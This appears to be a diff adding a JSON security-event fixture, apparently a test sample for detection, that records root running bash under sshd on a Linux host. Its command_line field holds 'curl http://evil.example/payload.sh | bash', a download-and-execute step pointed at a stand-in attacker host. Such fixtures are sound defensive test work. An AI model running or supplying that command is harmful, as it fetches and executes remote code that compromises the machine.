@@ -1,0 +1,22 @@
+{
+  "event": {
+    "category": "process",
+    "type": "start",
+    "action": "execve"
+  },
+  "process": {
+    "name": "bash",
+    "command_line": "curl http://evil.example/payload.sh | bash",
+    "parent": {
+      "name": "sshd"
+    },
+    "executable": "/usr/bin/bash"
+  },
+  "user": {
+    "name": "root"
+  },
+  "host": {
+    "name": "dev-vps"
+  },
+  "platform": "linux"
+}
